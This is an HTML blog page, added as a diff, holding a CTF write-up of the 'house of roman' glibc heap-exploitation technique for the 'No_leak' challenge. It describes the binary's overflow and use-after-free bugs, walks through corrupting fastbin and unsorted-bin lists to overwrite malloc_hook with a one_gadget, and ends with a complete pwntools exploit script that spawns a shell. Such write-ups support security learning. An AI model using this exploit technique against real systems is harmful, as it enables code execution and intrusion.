@@ -1,0 +1,782 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+
+
+  <meta name="keywords" content="pwn," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="from xman qctf : No_leak #0x00 Abstract​    House of roman, use this method when binary has no leak vulnerabilities. But it require binary can malloc any size heap chunk and one off-by-one vulnerabili">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="house-of-roman">
+<meta property="og:url" content="http://yoursite.com/2018/07/27/house-of-roman/index.html">
+<meta property="og:site_name" content="echo">
+<meta property="og:description" content="from xman qctf : No_leak #0x00 Abstract​    House of roman, use this method when binary has no leak vulnerabilities. But it require binary can malloc any size heap chunk and one off-by-one vulnerabili">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/2018/07/27/house-of-roman/create.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/27/house-of-roman/update.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/27/house-of-roman/delete.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/27/house-of-roman/prepare.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/27/house-of-roman/get.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/27/house-of-roman/modify.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/27/house-of-roman/link.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/27/house-of-roman/control.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/27/house-of-roman/fix.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/27/house-of-roman/attack.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/27/house-of-roman/onegadget.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/27/house-of-roman/trigger.png">
+<meta property="og:updated_time" content="2018-07-27T14:00:41.216Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="house-of-roman">
+<meta name="twitter:description" content="from xman qctf : No_leak #0x00 Abstract​    House of roman, use this method when binary has no leak vulnerabilities. But it require binary can malloc any size heap chunk and one off-by-one vulnerabili">
+<meta name="twitter:image" content="http://yoursite.com/2018/07/27/house-of-roman/create.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/07/27/house-of-roman/"/>
+
+
+
+
+
+  <title>house-of-roman | echo</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">echo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">meow~?</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/27/house-of-roman/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="echo">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/blog-logo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="echo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">house-of-roman</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-07-27T14:01:15+08:00">
+                2018-07-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><em>from xman qctf : No_leak</em></p>
+<h2 id="0x00-Abstract"><a href="#0x00-Abstract" class="headerlink" title="#0x00 Abstract"></a>#0x00 Abstract</h2><p>​    House of roman, use this method when binary has no leak vulnerabilities. But it require binary can malloc any size heap chunk and one off-by-one vulnerability.</p>
+<p>​    The process of house of roman are as following:</p>
+<ul>
+<li>1.get unsorted bin and make its fd pointe to malloc_hook-0x23</li>
+<li>2.modify size to fastbin</li>
+<li>3.link it to fastbin list</li>
+<li>4.malloc to control malloc_hook</li>
+<li>5.fix fastbin list( ??? seems no use, no fix is also okay)</li>
+<li>6.unsorted bin attack to make malloc_hook get main_arena+88</li>
+<li>7.modify low 3 byte make it pointer to one_gadget</li>
+</ul>
+<h2 id="0x01-Binary-analysis"><a href="#0x01-Binary-analysis" class="headerlink" title="#0x01 Binary analysis"></a>#0x01 Binary analysis</h2><ul>
+<li><p>1.Create</p>
+<p><img src="/2018/07/27/house-of-roman/./create.png" alt="Alt text"></p>
+<p>Can create heap chunk of any size, we can malloc at most 10 times.</p>
+</li>
+<li><p>2.Update</p>
+<p><img src="/2018/07/27/house-of-roman/./update.png" alt="Alt text"></p>
+<p>Can read input of any size: an overflow vulnerability.</p>
+</li>
+<li><p>3.Delete</p>
+<p><img src="/2018/07/27/house-of-roman/./delete.png" alt="Alt text"></p>
+<p>Pointer dose not set to null after free: double free vulnerability and uaf vulnerability.</p>
+</li>
+</ul>
+<h2 id="0x02-Exploit-process"><a href="#0x02-Exploit-process" class="headerlink" title="#0x02 Exploit process"></a>#0x02 Exploit process</h2><ul>
+<li><p>0.Prepare</p>
+<p><img src="/2018/07/27/house-of-roman/./prepare.png" alt="Alt text"></p>
+<p>User Create to malloc 0x68,0x80,0x68,0x80 chunk. get 2 fastbin and 2 smallbin.</p>
+<p>2 fastbin is used for link unsorted bin into fastbin list.</p>
+<p>One smallbin to link to fastbin list thus get the control of malloc_hook, another smallbin for unsorted bin attack .</p>
+</li>
+</ul>
+<ul>
+<li><p>1.get unsorted bin </p>
+<p><img src="/2018/07/27/house-of-roman/./get.png" alt="Alt text"></p>
+<p>Delete second chunk to get a unsorted bin. Its fd&amp;bk will point to main_arena+88.</p>
+<p>Update second chunk to make its fd point to malloc_hook+0x23.</p>
+</li>
+<li><p>2.modify size to fastbin</p>
+<p><img src="/2018/07/27/house-of-roman/./modify.png" alt="Alt text"></p>
+<p>we can Update first chunk to modify second chunk’s size, make it to 0x71(fastbin).</p>
+</li>
+<li><p>3.link it to fastbin list</p>
+<p><img src="/2018/07/27/house-of-roman/./link.png" alt="Alt text"></p>
+<p>Delete first and third chunk make fastbin list into 0x70-&gt;third chunk-&gt;first chunk.</p>
+<p>Update third chunk to make fastbin list into 0x70-&gt;third chunk-&gt;second chunk-&gt;malloc_hook+0x23-&gt;xxxxxx.</p>
+</li>
+<li><p>4.malloc to control malloc_hook</p>
+<p><img src="/2018/07/27/house-of-roman/./control.png" alt="Alt text"></p>
+<p>Use Create 3 times, get control of malloc_hook-0x13.</p>
+</li>
+<li><p>5.fix fastbin list</p>
+<p><img src="/2018/07/27/house-of-roman/./fix.png" alt="Alt text"></p>
+<p>free an fastbin and set its fd to null. Next time malloc fastbin will not corrupt.</p>
+<p>If don’t use fastbin later, no fix is also okay.(or I misunderstood it)</p>
+</li>
+<li><p>6.unsorted bin attack to make malloc_hook get main_arena+88</p>
+<p><img src="/2018/07/27/house-of-roman/./attack.png" alt="Alt text"></p>
+<p>Create 0x80 to clear unsorted bin list.</p>
+<p>Free forth chunk to make its fd&amp;bk point to main_arena+88.</p>
+<p>Update forth chunk to make its bk point to malloc_hook-0x10</p>
+<p>Create 0x80 to apply unsorted bin attack making malloc_hook = main_arena+88.</p>
+</li>
+<li><p>7.modify low 3 byte make it pointer to one_gadget</p>
+<p><img src="/2018/07/27/house-of-roman/./onegadget.png" alt="Alt text"></p>
+<p>Update the chunk that control malloc_hook-0x13 with ‘a’*0x13 and one_gadget address. Make malloc_hook point to one_gadget.</p>
+</li>
+<li><p>8.trigger malloc_hook</p>
+<p><img src="/2018/07/27/house-of-roman/./trigger.png" alt="Alt text"></p>
+<p>Free forth chunk make double free corrupt to trigger malloc_hook execute one_gadget. Thus you can get the shell.]</p>
+</li>
+</ul>
+<p>​    All above test are made in no-aslr environment. In remote server need brute force guess libc address 12bit because of aslr. It may need sometime.</p>
+<h2 id="0x03-Exp"><a href="#0x03-Exp" class="headerlink" title="#0x03 Exp"></a>#0x03 Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./NoLeak'</span>)<span class="comment">#,env=&#123;"LD_PRELOAD":"./libc-2.23.so"&#125;)</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,pay)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">'Data:'</span>)</span><br><span class="line">	p.send(pay)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Index'</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(idx,pay)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">        p.sendline(<span class="string">'3'</span>)</span><br><span class="line">        p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">        p.sendline(str(len(pay)))</span><br><span class="line">	p.recvuntil(<span class="string">'Data:'</span>)</span><br><span class="line">	p.send(pay)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get unsorted bin -&gt; modefiy size to fastbin -&gt; link it to fastbin list -&gt; malloc to control malloc_hook -&gt; fix fastbin list -&gt; unsorted bin attack to make malloc_hook get main_arena+88 -&gt; modefiy low 3 byte make it pointer to one_gadget</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p,'b *0x400997\nb *0x40090F\nb *0x40083D')</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''	test unsorted bin attack</span></span><br><span class="line"><span class="string">create(0x80,'0')	#0x602010</span></span><br><span class="line"><span class="string">create(0x80,'1')	#0x6020a0</span></span><br><span class="line"><span class="string">delete(0)</span></span><br><span class="line"><span class="string">update(0,p64(0)+p64(0x601068))</span></span><br><span class="line"><span class="string">create(0x80,'2')</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">'0'</span>)	<span class="comment">#0	0x602010</span></span><br><span class="line">create(<span class="number">0x80</span>,<span class="string">'1'</span>)	<span class="comment">#1	0x602080</span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">'2'</span>)	<span class="comment">#2	0x602110</span></span><br><span class="line">create(<span class="number">0x80</span>,<span class="string">'3'</span>)	<span class="comment">#4	0x602180</span></span><br><span class="line">delete(<span class="number">1</span>)	<span class="comment"># get main_arena+88</span></span><br><span class="line">update(<span class="number">1</span>,<span class="string">'\xed\x1a'</span>)	<span class="comment"># write main_arena+88 to malloc_hook-0x23	</span></span><br><span class="line">update(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x68</span>+<span class="string">'\x71'</span>)	<span class="comment"># make chunk 1 fake size 0x71 to make it be fastbin</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">update(<span class="number">2</span>,<span class="string">'\x70'</span>)	<span class="comment"># make chunk 1 into fastbin list</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">'4'</span>)	<span class="comment">#5	0x602110</span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">'5'</span>)	<span class="comment">#6	0x602080</span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">'6'</span>)	<span class="comment">#7	get malloc_hook 0x7ffff7dd1afd</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fix fastbin list	why fix it, not fix still can attack</span></span><br><span class="line"><span class="comment"># delete(4)</span></span><br><span class="line"><span class="comment"># update(4,p64(0))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p,'b *0x400997\nb *0x40090F\nb *0x40083D')</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x80</span>,<span class="string">'7'</span>)	<span class="comment"># 0x602210</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">update(<span class="number">3</span>,p64(<span class="number">0</span>)+<span class="string">'\x00\x1b'</span>)	<span class="comment"># use unsorted bin attack to make malloc_hook get main_arena+88</span></span><br><span class="line">create(<span class="number">0x80</span>,<span class="string">'8'</span>)</span><br><span class="line"></span><br><span class="line">update(<span class="number">6</span>,<span class="string">'a'</span>*<span class="number">0x13</span>+<span class="string">'\xa4\xd2\xaf'</span>)	<span class="comment"># write onegadget</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)#,'b *0x400997\nb *0x40090F\nb *0x40083D')</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/07/05/unsorted-bin/" rel="next" title="unsorted_bin">
+                <i class="fa fa-chevron-left"></i> unsorted_bin
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zNzU5MS8xNDEyMw=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/blog-logo.jpg"
+                alt="echo" />
+            
+              <p class="site-author-name" itemprop="name">echo</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-Abstract"><span class="nav-number">1.</span> <span class="nav-text">#0x00 Abstract</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-Binary-analysis"><span class="nav-number">2.</span> <span class="nav-text">#0x01 Binary analysis</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-Exploit-process"><span class="nav-number">3.</span> <span class="nav-text">#0x02 Exploit process</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-Exp"><span class="nav-number">4.</span> <span class="nav-text">#0x03 Exp</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">echo</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+  
+    <script type="text/javascript" color="0,0,255" opacity='0.8' zIndex="-2" count="30" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+</body>
+</html>
